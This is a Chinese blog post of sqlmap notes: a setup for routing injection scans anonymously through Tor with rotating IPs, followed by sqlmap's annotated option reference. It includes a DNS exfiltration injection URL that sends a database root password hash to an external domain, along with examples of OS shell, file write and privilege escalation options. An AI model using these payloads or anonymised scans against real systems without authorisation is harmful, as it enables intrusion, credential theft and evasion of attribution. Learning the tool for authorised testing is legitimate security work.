title: sqlmap笔记
author: Believe firmly
tags:
  - 工具
categories: []
date: 2017-09-08 16:06:00
---
<pre><code class="language-plain">         _
 ___ ___| |_____ ___ ___  {1.0.9.8#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org



#### 配合tor代理用法：
<div class="card-content article ">
​        

<a id="more"></a>

<h1 id="使用工具："><a href="#使用工具：" class="headerlink" title="使用工具："></a>使用工具：</h1><p>小飞机、Proxifier、Tor Browser、Tor IP Changer（<a href="https://github.com/seevik2580/tor-ip-changer" target="_blank" rel="noopener">传送门</a>）、Sqlmap</p>
<h1 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h1><h2 id="首先连上小飞机"><a href="#首先连上小飞机" class="headerlink" title="首先连上小飞机"></a>首先连上小飞机</h2><p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/2.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/2.png" alt="2"><div class="has-text-centered is-size-6 has-text-grey caption">2</div></a></p>
<h2 id="配置Proxifier"><a href="#配置Proxifier" class="headerlink" title="配置Proxifier"></a>配置Proxifier</h2><p>配置代理服务器</p>
<p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/3.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/3.png" alt="3"><div class="has-text-centered is-size-6 has-text-grey caption">3</div></a></p>
<p>配置代理规则</p>
<p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/4.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/4.png" alt="4"><div class="has-text-centered is-size-6 has-text-grey caption">4</div></a></p>
<p>此时你已经是全局代理状态了</p>
<p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/5.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/5.png" alt="5"><div class="has-text-centered is-size-6 has-text-grey caption">5</div></a></p>
<h2 id="配置并打开Tor浏览器（不要关闭）"><a href="#配置并打开Tor浏览器（不要关闭）" class="headerlink" title="配置并打开Tor浏览器（不要关闭）"></a>配置并打开Tor浏览器（不要关闭）</h2><p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/6.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/6.png" alt="6"><div class="has-text-centered is-size-6 has-text-grey caption">6</div></a></p>
<h2 id="打开Tor-IP-Changer"><a href="#打开Tor-IP-Changer" class="headerlink" title="打开Tor IP Changer"></a>打开Tor IP Changer</h2><p>点击 TOR server -&gt; Start，等待软件自动配置完成</p>
<p>点击 Options -&gt; Settings -&gt; Interval(IP切换间隔时间，越快越不稳）-&gt; Save</p>
<p>点击 IP changer -&gt; Start，如下图所示即为成功</p>
<p><a class="gallery-item" href="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/7.png"><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.07.08/7.png" alt="7"><div class="has-text-centered is-size-6 has-text-grey caption">7</div></a></p>
<h2 id="Sqlmap命令"><a href="#Sqlmap命令" class="headerlink" title="Sqlmap命令"></a>Sqlmap命令</h2><figure class="highlight shell hljs" id="code-1578534419152697"><figcaption><span class="fold"><i class="fas fa-angle-down"></i></span><a href="javascript:;" class="copy" title="Copy" data-clipboard-target="#code-1578534419152697 .code"><i class="fas fa-copy"></i></a></figcaption><div class="highlight-body"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --tor --tor-type="SOCKS5"</span><br></pre></td></tr></tbody></table></div></figure>

<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>使用此方法在匿名度，安全性上都可以大大提高，不过代价就是要牺牲掉一部分速度和稳定性。</p>
<p><a href="https://www.freebuf.com/column/171981.html" target="_blank" rel="noopener">https://www.freebuf.com/column/171981.html</a></p>



### 选项用法如下：
Usage: python sqlmap.py [options]
        

Options: 选项
  -h, --help            Show basic help message and exit
    基本的帮助信息
  -hh                   Show advanced help message and exit
    更加详细的帮助信息
  --version             Show program's version number and exit
    版本信息
  -v VERBOSE            Verbosity level: 0-6 (default 1)
    这个是设置sqlmap输出信息的详细程度，默认是1,设置成3（-v 3）就显示出payload的信息了，这个非常适合学习的一个参数
     <!-- more -->

  下面给出sqlmap.config文件中的对这个的详细描述
    # Verbosity level.
    # Valid: integer between 0 and 6
    # 0: Show only error and critical messages  只显示错误和关键信息
    # 1: Show also warning and info messages    警告和信息
    # 2: Show also debug messages               调试信息
    # 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)"("
    # 4: Show also HTTP requests                整个GET报文都看到了
    # 5: Show also HTTP responses' headers         返回报文的头部 
    # 6: Show also HTTP responses' page content    返回的html代码都有了
    # Default: 1

  Target: 目标
    At least one of these options has to be provided to define the
    target(s)
        至少从下面选择设定一个目标，最常用的就-u了，url嘛

    -d DIRECT           Connection string for direct database connection
    直接连接数据库，如：mysql的话
        -d mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME
        不过的话呢，这个我试过是要装第三方库的
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
        这个指定url的肯定最熟悉了
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
        burp用的多，但这个应该我们很少用啊，在burp的option-misc里面有个logging选项保存log文件
        查了一下：加多两个参数效率更快
        python sqlmap.py -l 文件名 --batch -smart
            batch：自动选yes。
            smart：启发式快速判断，节约时间。
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
        从xml文件中解析目标
    -m BULKFILE         Scan multiple targets given in a textual file
        这个应该是从大文件中读取超级多的目标，一般文件多了就一部分一部分地读了，这个就像是一个大字典
    -r REQUESTFILE      Load HTTP request from a file
        这个也用的较多，尤其是POST注入，将一些抓包软件（如burp）抓到的HTTP报文直接保存在文件中，跟着-r就搞掂了
    -g GOOGLEDORK       Process Google dork results as target URLs
        通过google搜索找到的url作为目标，这个也是google hacking了
    -c CONFIGFILE       Load options from a configuration INI file
        通过ini文件设置选项，这个还用过啊,下面的--save参数就是保存参数到ini文件的了，这个方便下次再次黑它

  Request: 请求
    These options can be used to specify how to connect to the target URL

    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
        指定HTTP请求的方法，GET，POST，PUT，MOVE等
    --data=DATA         Data string to be sent through POST
        指定POST的参数
    --param-del=PARA..  Character used for splitting parameter values
        这个拆分一些参数的，如下面用;拆分post参数
        python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
    --cookie=COOKIE     HTTP Cookie header value
        指定cookie值
    --cookie-del=COO..  Character used for splitting cookie values
        指定分割cookie值的字符是什么
    --load-cookies=L..  File containing cookies in Netscape/wget format
        这个是从文件中读取cookie吧，Netscape/wget格式的
    --drop-set-cookie   Ignore Set-Cookie header from response
        忽略响应包的Set-Cookie头
    --user-agent=AGENT  HTTP User-Agent header value
        指定User-Agent用户代理
    --random-agent      Use randomly selected HTTP User-Agent header value
        随机选用sqlmap目录中的User-Agent，这个文件再txt目录
    --host=HOST         HTTP Host header value
        指定主机头
    --referer=REFERER   HTTP Referer header value
        指定Referer头，就是请求来源的意思
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
        指定某个头部，如： -H "X-Forwarded-For: 127.0.0.1"
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
        这个的话应该是可以指定多个，用\n分割
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
        指定http认证类型
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
        指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
        指定一个私钥文件来认证
    --ignore-401        Ignore HTTP Error 401 (Unauthorized)
        忽略401错误
    --proxy=PROXY       Use a proxy to connect to the target URL
        指定代理
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
        指定代理的认证信息，就是账号密码
    --proxy-file=PRO..  Load proxy list from a file
        从文件中选择代理
    --ignore-proxy      Ignore system default proxy settings
        忽略系统默认代理
    --tor               Use Tor anonymity network
        使用tor网络
    --tor-port=TORPORT  Set Tor proxy port other than default
        设置tor的端口，如果不是默认端口的话
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
        设置tor代理的类型
    --check-tor         Check to see if Tor is used properly
        检测tor能不能用
    --delay=DELAY       Delay in seconds between each HTTP request
        设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
        设置超时时间，默认30秒
    --retries=RETRIES   Retries when the connection timeouts (default 3)
        设置重试的次数，默认3次
    --randomize=RPARAM  Randomly change value for given parameter(s)
        随机地更改给定参数的值
    --safe-url=SAFEURL  URL address to visit frequently during testing
        有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求
        这里提供一个安全不错误的连接，每隔一段时间都会去访问一下
    --safe-post=SAFE..  POST data to send to a safe URL
        这里设置一个正确的post数据
    --safe-req=SAFER..  Load safe HTTP request from a file
        从文件中读取安全，或者叫正确的http请求
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
        设置访问安全url的时间间隔
    --skip-urlencode    Skip URL encoding of payload data
        不进行url编码
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
        设置CSRF的token
    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
    
    --force-ssl         Force usage of SSL/HTTPS
        强制使用https
    --hpp               Use HTTP parameter pollution method
        尝试了一下，只能用于ASP，得到报错信息如下：
        [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets
    
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")
        发送请求之前，先运行这段python代码，比如对某个参数进行处理
        比如下面的，hash参数就是id的md5值
        python sqlmap.py -u "http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

  Optimization: 一些优化
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
        开启所有优化选项
    --predict-output    Predict common queries output
        预测常见的查询输出，可能跟一些报错出数据库信息那些有关，具体应要看源码才能说，有机会的话我看源码补充下
    --keep-alive        Use persistent HTTP(s) connections
        使用持久连接
    --null-connection   Retrieve page length without actual HTTP response body
        获得页面的长度（应该有多少字符吧，这个具体我也不确定） 除去HTTP的响应的body部分
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
        设置线程，默认为1

  Injection: 注入
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
        设定测试的参数，sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。
        这里就给你自己设定了 例如： -p "id,user-agent"
    
    --skip=SKIP         Skip testing for given parameter(s)
        跳过测试给定的参数
    --skip-static       Skip testing parameters that not appear dynamic
        跳过测试参数是否是静态的
    --dbms=DBMS         Force back-end DBMS to this value
        指定后端的数据库类型（mysql，mssql等）
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
        指定数据库的认证信息(user:password)
    --os=OS             Force back-end DBMS operating system to this value
        指定后台的系统类型
    --invalid-bignum    Use big numbers for invalidating values
        使用大数字（说是无效值），比如payload会出现8446744073709551610这样大的，配合-v 3就能看到
    --invalid-logical   Use logical operations for invalidating values
        使用逻辑字符，比如下面的：
            SELECT CHR(101)&amp;CHR(99)&amp;CHR(108)&amp;CHR(89)
            SELECT CHAR(82)+CHAR(90)+CHAR(71)+CHAR(84))
            SELECT CHAR(67)||CHAR(88)||CHAR(73)||CHAR(105)
    --invalid-string    Use random strings for invalidating values
        使用随机字符
    --no-cast           Turn off payload casting mechanism
        这个看着英文像是关闭payload构造机制
    --no-escape         Turn off string escaping mechanism
        关闭字符串逃逸机制
    --prefix=PREFIX     Injection payload prefix string
        设置注入的前缀，比如单引号注入点就设置前缀为单引号
    --suffix=SUFFIX     Injection payload suffix string
        设置注入payload的后缀
    --tamper=TAMPER     Use given script(s) for tampering injection data
        使用给定的脚本去修改payload中的数据，达到绕过WAF的目的

  Detection: 发现
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
        这个的话，sqlmap使用测试的方法就越多，发送越多请求，耗时也越长
    --risk=RISK         Risk of tests to perform (1-3, default 1)
        boolean-based blind SQL injection tests with AND are considered risk 1, with OR are considered risk 3：这句话是从sqlmap配置文件中找的，就是说基于布尔型盲注and型的就是risk1，or型的就是risk3，那么risk2是两个都搞？
    --string=STRING     String to match when query is evaluated to True
        设置一些返回页面中的字符，页面返回这个字符，说明我们的注入判断语句是正确的
    --not-string=NOT..  String to match when query is evaluated to False
        设置返回页面没返回某个字符，就是判断错误
    --regexp=REGEXP     Regexp to match when query is evaluated to True
        用正则匹配告诉sqlmap返回什么是正确的
    --code=CODE         HTTP code to match when query is evaluated to True
        用HTTP的响应码来判断注入判断语句是正确的，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200
    --text-only         Compare pages based only on the textual content
        真条件下的返回页面与假条件下返回页面是不同可以使用这个
    --titles            Compare pages based only on their titles
        真条件下的返回页面的标题与假条件下返回页面的标题是不同可以使用这个

  Techniques: 注入技术
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
        指定注入技术，默认使用全部(default "BEUSTQ")，那个含义如下：
        # B: Boolean-based blind SQL injection
        # E: Error-based SQL injection
        # U: UNION query SQL injection
        # S: Stacked queries SQL injection
        # T: Time-based blind SQL injection
        # Q: Inline SQL injection
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
        使用基于时间的盲注时，设置的数据库延迟，默认是5
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
        设置联合查询列的数目的范围
    --union-char=UCHAR  Character to use for bruteforcing number of columns
        设定union查询使用的字符，默认使用NULL
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
        这个就不知道了，使用表单中的元素放到union注入中？
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
        利用dns进行注入加快盲注，可以看看这个
        示例url：http://localhost/inject.php?user=123' and if((SELECT LOAD_FILE(CONCAT(、\\\',(SELECT concat(user,'_',mid(password,2,41)) from user where ser='root' limit 1),'.md5crack.cn\\foobar'))),1,1)%23 
    --second-order=S..  Resulting page URL searched for second-order response
        这个就是我们常说的二次注入了，设置后帮你寻找二次注入的页面，不过没用过。。。

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint
        这个应该是数据库指纹识别，加了可能识别更好
  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
        检索所有，这是拖库的节奏啊
    -b, --banner        Retrieve DBMS banner
        检索数据库的一些标志性的信息，就是指纹这样子吧
    --current-user      Retrieve DBMS current user
        检索当前连接数据库的用户
    --current-db        Retrieve DBMS current database
        检索当前连接的数据库
    --hostname          Retrieve DBMS server hostname
        检索服务器的主机名
    --is-dba            Detect if the DBMS current user is DBA
        检测是不是dba，就是root权限咯
    --users             Enumerate DBMS users
        枚举数据库用户
    --passwords         Enumerate DBMS users password hashes
        枚举数据库用户的哈希值
    --privileges        Enumerate DBMS users privileges
        枚举数据库用户的权限
    --roles             Enumerate DBMS users roles
        枚举数据库用户的角色
    --dbs               Enumerate DBMS databases
        枚举数据库有哪些
    --tables            Enumerate DBMS database tables
        枚举数据表名
    --columns           Enumerate DBMS database table columns
        枚举列名
    --schema            Enumerate DBMS schema
        这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举
    --count             Retrieve number of entries for table(s)
        枚举表格个数
    --dump              Dump DBMS database table entries
        输出数据库表的数据
    --dump-all          Dump all DBMS databases tables entries
        输出所有
    --search            Search column(s), table(s) and/or database name(s)
        查找特定的列名，表名或数据库名，配合下面的-D,-C,-T
    --comments          Retrieve DBMS comments
        枚举数据库的注释
    -D DB               DBMS database to enumerate
        指定数据库名
    -T TBL              DBMS database table(s) to enumerate
        指定表名
    -C COL              DBMS database table column(s) to enumerate
        指定列名
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
        指定不枚举那个列
    -U USER             DBMS user to enumerate
        枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
        枚举时排除系统的数据库
    --pivot-column=P..  Pivot column name
        以某一列为核心？这个用过没感觉出什么用
    --where=DUMPWHERE   Use WHERE condition while table dumping
        使用where调试限制table的输出
    --start=LIMITSTART  First query output entry to retrieve
        指定开始从第几行开始输出，如--start=3，前两行就不输出了
    --stop=LIMITSTOP    Last query output entry to retrieve
        指定从第几行开始停止输出
    --first=FIRSTCHAR   First query output word character to retrieve
        指定只输出第几个字符开始输出，盲注才有效，亲测
    --last=LASTCHAR     Last query output word character to retrieve
        指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，
        如 ：--first 3 --last 5  只输出3到5位置的字符
    --sql-query=QUERY   SQL statement to be executed
        指定执行我们的sql语句
    --sql-shell         Prompt for an interactive SQL shell
        返回一个sql的shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)
        从文件中读取执行sql语句

  Brute force: 爆破
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
        检测常见的表名
    --common-columns    Check existence of common columns
        检测常见的列名

  User-defined function injection: 使用用户定义的函数注入
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library
        这两个具体没用过，直译就是注入用户定义的函数，另一个就是指定本地共享库

  File system access:  文件系统访问
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=RFILE   Read a file from the back-end DBMS file system
        读取服务器文件
    --file-write=WFILE  Write a local file on the back-end DBMS file system
        写服务器文件
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to
        设置写入的绝对路径

  Operating system access:  操作系统访问
    These options can be used to access the back-end database management
    system underlying operating system

    注意下面这些要有相应的权限，一般要root
    
    --os-cmd=OSCMD      Execute an operating system command
        执行一个指定的命令
    --os-shell          Prompt for an interactive operating system shell
        返回一个shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
        这个参数需要访问metasploit，结合metasploit使用的
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
        这个参数也需要访问metasploit
    --os-bof            Stored procedure buffer overflow exploitation
        尝试储存过程的缓冲区溢出
    --priv-esc          Database process user privilege escalation
        利用数据库进程用户进行权限提升
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
        指定metasploit的路径
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
        设定临时文件路径

  Windows registry access: windows注册表访问
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
        读取一个键
    --reg-add           Write a Windows registry key value data
        写一个键
    --reg-del           Delete a Windows registry key value
        删除一个键
下面的应该配合上面使用的
    --reg-key=REGKEY    Windows registry key
        指定键
    --reg-value=REGVAL  Windows registry key value
        指定键值
    --reg-data=REGDATA  Windows registry key value data
        值的数据
    --reg-type=REGTYPE  Windows registry key value type
        值得类型

  General: 通用的
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
        从.sqlite恢复那个会话（注入过就会自动生成），那个文件在sqlmap的output文件，（windows在C:\Users\Administrator\.sqlmap\output\）
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
        HTTP请求保存到文件中
    --batch             Never ask for user input, use the default behaviour
        不要询问，使用默认选项
    --binary-fields=..  Result fields having binary values (e.g. "digest")
        设置有些字段是二进制数值？
    --charset=CHARSET   Force character encoding used for data retrieval
        设置编码
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
        从某个url开始爬取网站
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
        排除爬取网站的关键字，如logout
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
        设置输出结果时的分隔符
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
        设置输出是的格式，csv，html，SQLITE等
    --eta               Display for each output the estimated time of arrival
        显示每个输出估计的耗时
    --flush-session     Flush session files for current target
        刷新这个url的储存会话信息，就是更新以前注入的记录，如管理员改密码了，就要重新注入了
    --forms             Parse and test forms on target URL
        解析测试目标url的表单
    --fresh-queries     Ignore query results stored in session file
        忽略保存在会话文件储存的查询结果
    --hex               Use DBMS hex function(s) for data retrieval
        使用十六进制
    --output-dir=OUT..  Custom output directory path
        设置输出路径
    --parse-errors      Parse and display DBMS error messages from responses
        解析输出数据库错误信息
    --save=SAVECONFIG   Save options to a configuration INI file
        保存选项到ini文件
    --scope=SCOPE       Regexp to filter targets from provided proxy log
        正则表达式过滤代理文件提供的代理？
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
        设置含我们指定关键字的某些测试的payload
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
        跳过测试指定关键字的某些测试的payload
    --update            Update sqlmap
        更新sqlmap，记得更新了
         Miscellaneous:  杂项
    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
        短记忆，什么鬼
    --alert=ALERT       Run host OS command(s) when SQL injection is found
        如果存在注入，运行系统命令
    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
        设定
    --beep              Beep on question and/or when SQL injection is found
        哔一声，找到注入的话
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
        清理数据库什么鬼，这个也不懂   
    --dependencies      Check for missing (non-core) sqlmap dependencies
        看看sqlmap缺少什么第三方库
    --disable-coloring  Disable console output coloring
        关闭颜色的输出，就没那么美观咯
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
        指定google搜索的页码，找sqlmap注入目标
    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection
        尝试辨认WAF/IPS/IDS的类型
    --mobile            Imitate smartphone through HTTP User-Agent header
        使用手机User-Agent
    --offline           Work in offline mode (only use session data)
        使用离线模式
    --page-rank         Display page rank (PR) for Google dork results
        显示该url，google的rank值
    --purge-output      Safely remove all content from output directory
        安全地删除output文件夹
    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
        跳过探测WAF/IPS/IDS
    --smart             Conduct thorough tests only if positive heuristic(s)
        全面的扫描如果是积极的启发式，不知什么鬼
    --sqlmap-shell      Prompt for an interactive sqlmap shell
        交互式的sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
        设置临时文件目录
    --wizard            Simple wizard interface for beginner users
        为初学者用户提供简单的向导，就是问你那个url，一步步问下去